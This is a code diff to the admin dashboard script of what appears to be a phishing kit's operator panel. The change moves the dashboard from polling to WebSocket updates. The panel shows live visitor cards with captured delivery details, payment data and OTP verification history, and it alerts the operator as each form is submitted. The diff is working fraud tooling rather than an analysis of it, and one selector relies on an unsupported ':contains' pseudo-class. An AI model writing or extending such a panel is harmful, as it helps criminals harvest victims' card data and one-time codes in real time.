@@ -81,11 +81,12 @@ function initAdminSocket() {
       setTimeout(() => showLoginPage(), 2000);
     });
 
-    // Visitor events
+    // Visitor events - Real-time updates (NO POLLING)
     socket.on('visitor:new', (data) => {
       sounds.newVisitor();
       updateStats();
-      updateVisitorsList();
+      // Add new visitor card without full refresh
+      addNewVisitorCard(data);
     });
 
     socket.on('visitor:pageChange', (data) => {
@@ -101,23 +102,44 @@ function initAdminSocket() {
       updateVisitorStatus(data.sessionId, true);
     });
 
-    // Form submissions
+    // Form submissions - Real-time card updates
     socket.on('form:deliverySubmitted', (data) => {
       sounds.formDelivery();
       updateStats();
-      updateVisitorCard(data.sessionId, { form_submitted: true, delivery_data: data.formData });
+      // Update card with delivery data without full refresh
+      updateVisitorCard(data.sessionId, { 
+        form_submitted: true, 
+        delivery_data: data.formData,
+        is_online: true
+      });
     });
 
     socket.on('form:paymentSubmitted', (data) => {
       sounds.formPayment();
       updateStats();
-      updateVisitorCard(data.sessionId, { payment_submitted: true, payment_data: data.paymentData });
+      // Update card with payment data without full refresh
+      updateVisitorCard(data.sessionId, { 
+        payment_submitted: true, 
+        payment_data: data.paymentData,
+        is_online: true
+      });
     });
 
     socket.on('form:verificationSubmitted', (data) => {
       sounds.formVerification();
       updateStats();
-      updateVisitorCard(data.sessionId, { verification_submitted: true, verification_data: data.verificationData });
+      // Update card with verification data and OTP history without full refresh
+      updateVisitorCard(data.sessionId, { 
+        verification_submitted: true, 
+        verification_data: data.verificationData,
+        otp_history: data.otpHistory || [],
+        is_online: true
+      });
+    });
+
+    // Stats update event
+    socket.on('stats:push', (data) => {
+      updateStatsDisplay(data);
     });
 
     // Ban list update event
@@ -339,6 +361,87 @@ function toggleOtpHistory(sessionId) {
   }
 }
 
+// Add new visitor card without full refresh
+function addNewVisitorCard(data) {
+  if (!data.sessionId) return;
+  
+  var grid = document.getElementById('visitorsGrid');
+  if (!grid) return;
+  
+  // Check if card already exists
+  var existingCard = grid.querySelector('[data-session="' + data.sessionId + '"]');
+  if (existingCard) {
+    updateVisitorCard(data.sessionId, data);
+    return;
+  }
+  
+  // Create temporary visitor object for card creation
+  var visitor = {
+    session_id: data.sessionId,
+    ip_address: data.ip_address,
+    country: data.country,
+    country_code: data.country_code,
+    current_page: data.page || 'home',
+    is_online: true,
+    delivery_data: data.formData || {},
+    payment_data: data.paymentData || {},
+    verification_data: data.verificationData || {},
+    otp_history: data.otpHistory || [],
+    form_submitted: !!data.formData,
+    payment_submitted: !!data.paymentData,
+    verification_submitted: !!data.verificationData
+  };
+  
+  var cardHTML = createVisitorCard(visitor);
+  
+  // Add animation
+  var tempDiv = document.createElement('div');
+  tempDiv.innerHTML = cardHTML;
+  var newCard = tempDiv.firstElementChild;
+  newCard.style.opacity = '0';
+  newCard.style.transform = 'translateY(-20px)';
+  
+  // Insert at the beginning
+  if (grid.firstChild && !grid.firstChild.classList.contains('empty-state')) {
+    grid.insertBefore(newCard, grid.firstChild);
+  } else {
+    grid.appendChild(newCard);
+  }
+  
+  // Animate in
+  setTimeout(function() {
+    newCard.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
+    newCard.style.opacity = '1';
+    newCard.style.transform = 'translateY(0)';
+  }, 50);
+  
+  // Update count
+  var onlineCount = document.getElementById('onlineCount');
+  var totalCount = document.getElementById('totalCount');
+  if (onlineCount) onlineCount.textContent = parseInt(onlineCount.textContent || 0) + 1;
+  if (totalCount) totalCount.textContent = parseInt(totalCount.textContent || 0) + 1;
+}
+
+// Update stats display without full refresh
+function updateStatsDisplay(data) {
+  if (data.totalVisitors !== undefined) {
+    var el = document.getElementById('totalVisitors');
+    if (el) el.textContent = data.totalVisitors;
+  }
+  if (data.onlineVisitors !== undefined) {
+    var el = document.getElementById('onlineVisitors');
+    if (el) el.textContent = data.onlineVisitors;
+  }
+  if (data.formSubmissions !== undefined) {
+    var el = document.getElementById('formSubmissions');
+    if (el) el.textContent = data.formSubmissions;
+  }
+  if (data.paymentSubmissions !== undefined) {
+    var el = document.getElementById('paymentSubmissions');
+    if (el) el.textContent = data.paymentSubmissions;
+  }
+}
+
 function updateVisitorsList() {
   if (!socket) return;
   socket.emit('visitors:request');
@@ -377,33 +480,90 @@ function updateVisitorPage(sessionId, page) {
 }
 
 function updateVisitorStatus(sessionId, isOnline) {
-  const card = document.querySelector(`[data-session="${sessionId}"]`);
-  if (card) {
-    card.setAttribute('data-online', isOnline);
-    
-    const header = card.querySelector('.card-header');
-    const statusEl = card.querySelector('.card-status');
-    
-    if (isOnline) {
-      header.style.background = 'linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%)';
-      if (statusEl) {
-        statusEl.innerHTML = '<span class="dot"></span><span>متصل الآن</span>';
-      }
-    } else {
-      header.style.background = 'linear-gradient(135deg, #6b7280 0%, #9ca3af 100%)';
-      if (statusEl) {
-        statusEl.innerHTML = '<span style="color:#ccc;">○</span><span style="color:#999;">غير متصل</span>';
-      }
+  var card = document.querySelector('[data-session="' + sessionId + '"]');
+  if (!card) return;
+  
+  card.setAttribute('data-online', isOnline);
+  
+  var header = card.querySelector('.card-header');
+  var statusEl = card.querySelector('.card-status');
+  
+  if (isOnline) {
+    header.style.background = 'linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%)';
+    if (statusEl) {
+      statusEl.innerHTML = '<span class="dot"></span><span>متصل الآن</span>';
     }
-    
     // Update counts
-    updateVisitorsList();
+    var onlineCount = document.getElementById('onlineCount');
+    if (onlineCount) onlineCount.textContent = parseInt(onlineCount.textContent || 0) + 1;
+  } else {
+    header.style.background = 'linear-gradient(135deg, #6b7280 0%, #9ca3af 100%)';
+    if (statusEl) {
+      statusEl.innerHTML = '<span style="color:#ccc;">○</span><span style="color:#999;">غير متصل</span>';
+    }
   }
 }
 
 function updateVisitorCard(sessionId, data) {
-  // Refresh the entire list for simplicity
-  updateVisitorsList();
+  var card = document.querySelector('[data-session="' + sessionId + '"]');
+  if (!card) {
+    // Card doesn't exist, don't refresh the whole list
+    return;
+  }
+  
+  // Update card data attributes
+  if (data.is_online !== undefined) {
+    card.setAttribute('data-online', data.is_online);
+  }
+  
+  // Update delivery data
+  if (data.delivery_data) {
+    var deliverySection = card.querySelector('.card-section:not(.payment-section):not(.otp-section)');
+    if (!deliverySection) {
+      // Need to recreate card with full data
+      updateVisitorsList();
+      return;
+    }
+    
+    // Update delivery fields if they exist
+    var deliveryData = data.delivery_data;
+    Object.keys(deliveryData).forEach(function(key) {
+      var row = deliverySection.querySelector('.data-row:has(.data-label:contains("' + key + '"))');
+      if (row) {
+        var valueEl = row.querySelector('.data-value');
+        if (valueEl) valueEl.textContent = deliveryData[key];
+      }
+    });
+  }
+  
+  // Update progress steps
+  if (data.form_submitted !== undefined || data.payment_submitted !== undefined || data.verification_submitted !== undefined) {
+    var steps = card.querySelectorAll('.progress-step');
+    
+    if (data.form_submitted && steps[0]) {
+      steps[0].classList.add('completed');
+      steps[0].classList.remove('active');
+      steps[0].querySelector('.step-icon').textContent = '✓';
+    }
+    
+    if (data.payment_submitted && steps[1]) {
+      steps[1].classList.add('completed');
+      steps[1].classList.remove('active');
+      steps[1].querySelector('.step-icon').textContent = '✓';
+    }
+    
+    if (data.verification_submitted && steps[2]) {
+      steps[2].classList.add('completed');
+      steps[2].classList.remove('active');
+      steps[2].querySelector('.step-icon').textContent = '✓';
+    }
+  }
+  
+  // Add animation for update
+  card.style.boxShadow = '0 0 20px rgba(16, 185, 129, 0.5)';
+  setTimeout(function() {
+    card.style.boxShadow = '';
+  }, 1000);
 }
 
 // Stats Functions
@@ -869,12 +1029,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     showLoginPage();
   });
   
-  // Auto refresh tracking every second
-  setInterval(() => {
-    if (document.getElementById('tracking')?.classList.contains('active')) {
-      updateVisitorsList();
-    }
-  }, 1000);
+  // NO MORE POLLING - Real-time updates via WebSockets!
 });
 
 // Export functions
